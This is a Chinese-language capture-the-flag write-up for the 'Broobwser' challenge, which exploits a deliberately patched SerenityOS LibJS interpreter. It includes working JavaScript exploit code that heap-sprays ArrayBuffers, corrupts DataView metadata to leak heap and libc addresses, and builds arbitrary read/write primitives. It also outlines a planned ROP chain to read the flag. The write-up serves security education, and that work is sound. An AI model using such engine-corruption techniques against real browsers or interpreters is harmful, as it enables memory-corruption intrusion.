# Broobwser

## 题目简述

题目提供一个被补丁修改过的 SerenityOS Lagom LibJS 解释器环境。附件说明要求基于 SerenityOS commit `7537a045e5f127804040e44b13dcca3c7a5de3c6` 打 `serenity.patch` 后运行 `Meta/serenity.sh run lagom js` 复现；远端容器为 Ubuntu 22.04，服务端把选手输入的 JavaScript 读到 `EOF` 后写入临时文件并执行 `/js <脚本>`。目标是在 LibJS 中构造稳定任意地址读写，再通过 ROP 读取 `/flag`。

## 解题过程

这题是一个 JS 引擎溢出题目。JS 引擎是 SerenityOS 中的 LibJS，附件给出的玩家服务端只负责收集脚本、写临时文件并调用 `/js`，因此需要把重点放在补丁后的 LibJS 对象布局和远端 Ubuntu 22.04 下的堆稳定性。

在本地调试劫持程序流其实非常简单，因为偏移只要拉到gdb调试下就可以找到。但这题主要的难度在于远程服务器的堆布局十分不稳定，哪怕多加一行代码输入都有可能改变堆布局，从而导致溢出的数据不对，所以关键在于获取稳定的任意地址读写。在本地测试的时候，我用了堆喷来增加稳定性。再接下来的部分就是ROP读取flag。

```js
function hex(i){return "0x" + i.toString(16);}
gc()

abs = []
dvs = []

for(var i = 0; i < 0x100; i++){
    abs.push(new ArrayBuffer(0x100));
    abs[i].byteLength = 0x1337;
}

for(var i = 0; i < 0x100; i++){
    dvs.push(new DataView(abs[i]));
    dvs[i].setBigUint64(0, 0x4141414141414141n, true);
    dvs[i].setBigUint64(8, BigInt(i), true);
}

for(var i = 0; i < 0x100; i++){
    heap_addr = dvs[i].getBigUint64(0x1f8, true);
    size = dvs[i].getBigUint64(0x218, true);
    if(size == 0x3341n && heap_addr > 0x500000000000n){
        console.log(hex(heap_addr));
        break;
    }
}
if(heap_addr < 0x500000000000n){
    console.log("Try again 1");
    exit(0);
}

lib_lagom_leak = dvs[i].getBigUint64(0x2b8, true);
libc_base = lib_lagom_leak - 0xcb67b0n
console.log(hex(lib_lagom_leak));
console.log(hex(libc_base));

bin_sh = libc_base + 0x1d8698n;
environ = libc_base + 0xd142d0n;
dvs[i].setBigUint64(0x1f8, bin_sh, true);
for(var j = 0; j < 0x100; j++){
    verify = dvs[j].getBigUint64(0, true);
    if(verify == 0x68732f6e69622fn){
        console.log("Found j");
        break;
    }
}

if(verify != 0x68732f6e69622fn){
    console.log("Try again 2");
    exit(0);
}

function aar(addr){
    dvs[i].setBigUint64(0x1f8, addr, true);
    return dvs[j].getBigUint64(0, true);
}
function aaw(addr, value){
    dvs[i].setBigUint64(0x1f8, addr, true);
    dvs[j].setBigUint64(0, value, true);
}

console.log(hex(aar(environ)));
```

## 方法总结

- 核心技巧：利用 LibJS 对象布局破坏，把 `ArrayBuffer` / `DataView` 的元数据改成可控指针，从而获得任意地址读写，再泄露 libc 并布置 ROP。
- 识别信号：题目给的是单独 JS 解释器、固定 commit 和补丁，而远端只执行脚本文件时，应优先做引擎对象模型和堆布局分析，不要把服务端包装层当主要攻击面。
- 复用要点：这类引擎题本地可先用 gdb 拉偏移，但远端稳定性取决于堆喷和对象筛选条件。payload 中的泄露偏移、`environ`、`/bin/sh` 等地址都绑定远端 libc/LibJS 版本，迁移时必须重新确认。
